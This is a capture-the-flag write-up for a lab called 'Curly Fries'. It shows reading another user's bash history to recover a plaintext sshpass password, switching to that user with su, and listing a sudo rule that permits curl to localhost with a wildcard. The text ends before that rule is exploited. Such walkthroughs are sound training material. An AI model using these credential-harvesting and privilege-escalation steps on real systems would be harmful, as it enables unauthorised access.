# Curly Fries
Uh-oh, our friend Fry has been typing at the keyboard and running all kinds of commands, but his fingers are dirty from all the curly fries he has been eating!!

Escalate your privileges and run the program in the root user's home directory.

# Flag

# Solution
We are logged in as `user`. We can see the bash history of `fry`:

```bash
user@curlyfries:/home/fry$ ls -la
total 20
drwxr-sr-x    1 fry      fry           4096 May 24 16:39 .
drwxr-xr-x    1 root     root          4096 May 24 16:39 ..
-rw-r--r--    1 fry      fry            118 May 24 16:39 .bash_history
-rwxr-xr-x    1 fry      fry           3850 May 24 16:39 .bashrc
-rw-r--r--    1 fry      fry             17 May 24 16:39 .profile
user@curlyfries:/home/fry$ cat .bash_history
pwd
whoami
cd /tmp
date
sshpas
sshpass
sshpass -p iLoveCurlyFriesYumYumInMyTumTum ssh fry@localhost
sl
ls
ls -la
exit
```

We can switch to `fry` user using the credentials:

```bash
user@curlyfries:/home/fry$ su fry
Password: 
fry@curlyfries:~$ sudo -l
User fry may run the following commands on
        curly-fries-17b275f72d0fa9cf-b9d75b-6lrdm:
    (root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
```

